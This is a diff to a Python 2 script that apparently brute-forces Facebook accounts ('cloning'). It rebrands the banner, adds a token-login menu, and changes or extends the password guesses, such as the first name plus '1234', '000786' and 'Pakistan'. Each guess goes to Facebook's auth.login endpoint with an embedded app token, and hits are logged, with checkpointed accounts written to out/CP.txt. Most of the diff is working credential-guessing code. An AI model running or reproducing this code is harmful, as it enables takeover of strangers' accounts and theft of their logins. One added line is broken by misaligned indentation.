@@ -47,22 +47,25 @@ def jalan(z):
 
 #### LOGO ####
 logo = """
-\x1b[1;94m░░░░░██╗░█████╗░███╗░░░███╗
-\x1b[1;94m░░░░░██║██╔══██╗████╗░████║
-\x1b[1;94m░░░░░██║███████║██╔████╔██║
-\x1b[1;94m██╗░░██║██╔══██║██║╚██╔╝██║
-\x1b[1;94m╚█████╔╝██║░░██║██║░╚═╝░██║
-\x1b[1;94m░╚════╝░╚═╝░░╚═╝╚═╝░░░░░╚═╝
-\033[0;39m╔▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬╗
-\033[0;39m║\033[0;36m* \033[0;36mAuthor  \033[1;36m : \033[1;31mJAM-SHAHRUKH_\033[0;31m║
-\033[0;39m║\033[1;33m* \033[1;33mGitHub  \033[1;33m : \033[1;33m\033[4mhttps://Github.com/JAM\033[0m \033[0;31m║
-\033[0;39m║\033[0;36m* \033[0;32mWhatsApp \033[1;32m: \033[1;32m+971528752764\033[0;31m║
-\033[0;39m╚▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬╝"""
+\033[1;92m         _________  _______   _______ 
+\033[1;92m         \__    _/ (  ___  ) (       )
+\033[1;92m            )  (   | (   ) | | () () |
+\033[1;92m            |  |   | (___) | | || || |
+\033[1;92m            |  |   |  ___  | | |(_)| |
+\033[1;92m            |  |   | (   ) | | |   | |
+\033[1;92m         |\_)  )   | )   ( | | )   ( |
+\033[1;92m         (____/    |/     \| |/     \|
+\033[1;97m              BLACK LISTED UNITY
+\033[1;96m╔▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬╗
+\033[1;96m║\033[0;36m* \033[0;36mAuthor  \033[1;36m : \033[1;31mJAM-SHAHRUKH
+\033[1;96m║\033[1;36m* \033[1;33mGitHub  \033[1;33m : \033[1;33m\033[4mhttps://Github.com/JAM
+\033[1;96m║\033[0;36m* \033[0;32mWhatsApp \033[1;32m: \033[1;32m+923053176060
+\033[1;96m╚▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬╝"""
 
 def tik():
 	titik = ['.   ','..  ','... ']
 	for o in titik:
-		print("\r\033[1;96m[●] \x1b[1;93mSedang masuk \x1b[1;97m"+o),;sys.stdout.flush();time.sleep(1)
+		print("\r\033[1;96m[●] \x1b[1;93mWAIT KR YR \x1b[1;97m"+o),;sys.stdout.flush();time.sleep(1)
 
 
 back = 0
@@ -94,11 +97,41 @@ while (loop == 'true'):
             print "Logged in successfully as " + username
             loop = 'false'
         else:
-            print "yang bener dong"
-            os.system('xdg-open https://wa.me/6285691015635')
+            print "WRONG USER"
+            os.system('xdg-open https://www.youtube.com/channel/UCe6wmIybCxpRSB4o6pozMOA')
     else:
-        print "salah sayang!"
-        os.system('xdg-open https://wa.me/6285691015635')
+        print "Successfully!"
+        os.system('xdg-open https://www.youtube.com/channel/UCe6wmIybCxpRSB4o6pozMOA')
+def methodlogin():
+	os.system('clear')
+	print logo
+	print "[1] Login With ID/Password."
+	print "[2] Login Using Token."
+	print "[3] Exit."
+	print ('      ')
+	hos = raw_input("\nChoose Option >>  ")
+	if hos =="":
+		print"[!]  Wrong Input"
+		exit()
+	elif hos =="1":
+		login()
+	elif hos =="2":
+		os.system('clear')
+		print logo
+		hosp = raw_input("[+] Give Token : ")
+		tik()
+		hopa = open('login.txt','w')
+		hopa.write(hosp)
+		hopa.close()
+		print "\n[✓] Logged In Successfully."
+		time.sleep(1)
+		os.system('xdg-open https://www.youtube.com/channel/UCe6wmIybCxpRSB4o6pozMOA')
+		menu()
+	elif hos =="0":
+		exit()
+	else:
+		print"[!] Wrong Input"
+		exit()
 
 def login():
 	os.system('clear')
@@ -296,7 +329,7 @@ def pilih_super():
 	titik = ['.   ','..  ','... ']
 	for o in titik:
 		print("\r\033[1;32;40m[✺] Cloning\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
-	print "\n\033[1;94m        ❈     \x1b[1;91mTo Stop Process Press CTRL+Z \033[1;94m    ❈"
+	print "\n\033[1;94m   ❈  \x1b[1;91mTo Stop Process Press CTRL+Z \033[1;94m  ❈"
 	print "   \033[1;31;48m●══════════════════════JAM══════════════════════●"
 
 	def main(arg):
@@ -337,7 +370,7 @@ def pilih_super():
 							cek.close()
 							cekpoint.append(user+pass2)
 						else:
-							pass3 = 'Pakistan123'
+							pass3 = b['first_name'] + '1234'
 							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 							q = json.load(data)
 							if 'access_token' in q:
@@ -351,7 +384,7 @@ def pilih_super():
 									cek.close()
 									cekpoint.append(user+pass3)
 								else:
-									pass4 = '000786'
+									pass4 = b['first_name'] + '12345'
 									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 									q = json.load(data)
 									if 'access_token' in q:
@@ -379,7 +412,7 @@ def pilih_super():
 													cek.close()
 													cekpoint.append(user+pass5)
 												else:
-													pass6 = 'Pakistan'
+													pass6 = '000786'
 													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 													q = json.load(data)
 													if 'access_token' in q:
@@ -392,6 +425,22 @@ def pilih_super():
 															cek.write(user+"|"+pass6+"\n")
 															cek.close()
 															cekpoint.append(user+pass6)
+														else:
+															a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
+															b = json.loads(a.text)
+															pass7 = 'Pakistan'
+															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+													                q = json.load(data)
+															if 'access_token' in q:
+																print '\x1b[1;92m[OK] \x1b[1;92mID \x1b[1;92m✯ \x1b[1;92m' + user + ' \x1b[1;92mPass \x1b[1;92m✯ \x1b[1;92m' + pass7 + '\n'
+																oks.append(user+pass7)
+															else:
+																if 'www.facebook.com' in q["error_msg"]:
+																	print '\x1b[1;97m[CP] \x1b[1;97mID \x1b[1;97m✯ \x1b[1;97m' + user + ' \x1b[1;97mPass \x1b[1;97m✯ \x1b[1;97m' + pass7 + '\n'
+																	cek = open("out/CP.txt", "a")
+																	cek.write(user+"|"+pass7+"\n")
+																	cek.close()
+																	cekpoint.append(user+pass7)
  										
 		except:																		
 			pass
